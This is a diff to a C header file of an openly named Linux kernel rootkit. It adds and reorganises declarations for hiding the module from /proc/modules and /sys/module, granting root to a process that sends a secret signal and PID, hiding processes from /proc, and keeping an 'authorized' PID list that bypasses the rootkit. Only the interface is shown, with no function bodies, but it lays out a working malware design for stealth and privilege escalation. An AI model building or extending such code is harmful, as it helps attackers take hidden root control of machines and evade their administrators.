@@ -58,14 +58,18 @@
     } while (0)
 
 /**
- * Structure used to store the list of hidden PIDs
+ * Structure representing an entry in a list of PIDs.
  */
-typedef struct hidden_pid_tag {
-    struct list_head list; // PID linked list
-    pid_t i32_pid;         // PID to hide
-} hidden_pid_t;
+typedef struct pid_list_tag {
+    struct list_head list; // PID linked list head
+    pid_t i32_pid;         // PID value
+} pid_list_t;
+
+typedef struct task_struct task_t;
 
 extern struct list_head hidden_pids_list; // Head of the hidden PIDs linked list
+// Head of the authorized PIDs linked list (processes that bypass the rootkit)
+extern struct list_head authorized_pids_list;
 
 /**
  * Gets the effective PID for the given PID.
@@ -95,32 +99,28 @@ static inline pid_t get_effective_pid(const pid_t i32_pid)
 }
 
 /**
- * Hides the rootkit from /proc/modules and /sys/module/
+ * Hides the rootkit from /proc/modules and /sys/module/.
  */
 void hide_module(void);
 
 /**
- * Clear the list of hidden PIDs and free the memory
- */
-void show_all_processes(void);
-
-/**
- * Checks if the given PID is in the list of hidden PIDs.
- * If the given PID is 0, the current process is checked.
+ * Elevates the current process to root.
  *
- * @param i32_pid The PID to check
- * @return `true` if the given PID is in the list of hidden PIDs, `false` otherwise
- */
-bool is_pid_hidden(const pid_t i32_pid);
-
-/**
- * Elevates the current process to root
- *
- * @param i32_pid The PID that was passed to the rootkit (should be equal to SIGROOT)
- * @param i32_sig The signal that was passed (currently unused)
+ * @param i32_pid The PID that was passed to the rootkit
+ *                (should be equal to PID_SECRET_ROOT to be allowed to elevate)
+ * @param i32_sig The signal that was passed (SIGROOT)
  * @return 0 on success, otherwise an error code
  */
 long give_root(const pid_t i32_pid, const int i32_sig);
+
+/**
+ * Checks if the given PID is in the list of hidden processes.
+ * If the given PID is 0, the current process is checked.
+ *
+ * @param i32_pid The PID to check
+ * @return `true` if the given PID is in the list of hidden processes, `false` otherwise
+ */
+bool is_pid_hidden(const pid_t i32_pid);
 
 /**
  * Hides or shows (unhides) the given process from /proc/ and /proc/PID/.
@@ -131,5 +131,35 @@ long give_root(const pid_t i32_pid, const int i32_sig);
  * @return 0 on success, otherwise an error code
  */
 long show_hide_process(const pid_t i32_pid, const int i32_sig);
+
+/**
+ * Clears the list of hidden PIDs and frees all associated memory.
+ */
+void show_all_processes(void);
+
+/**
+ * Checks if the given PID is in the list of authorized processes.
+ * If the given PID is 0, the current process is checked.
+ * @note Authorized processes bypass the rootkit protection mechanisms.
+ *
+ * @param i32_pid The PID to check
+ * @return `true` if the given PID is in the list of authorized processes, `false` otherwise
+ */
+bool is_process_authorized(const pid_t i32_pid);
+
+/**
+ * Authorizes the given process to bypass the rootkit protection mechanisms.
+ * If the given PID is 0, the current process is authorized.
+ *
+ * @param i32_pid The PID to authorize
+ * @param i32_sig The signal that was passed (SIGAUTH)
+ * @return 0 on success, otherwise an error code
+ */
+long authorize_process(const pid_t i32_pid, const int i32_sig);
+
+/**
+ * Clears the list of authorized PIDs and frees all associated memory.
+ */
+void clear_auth_list(void);
 
 #endif
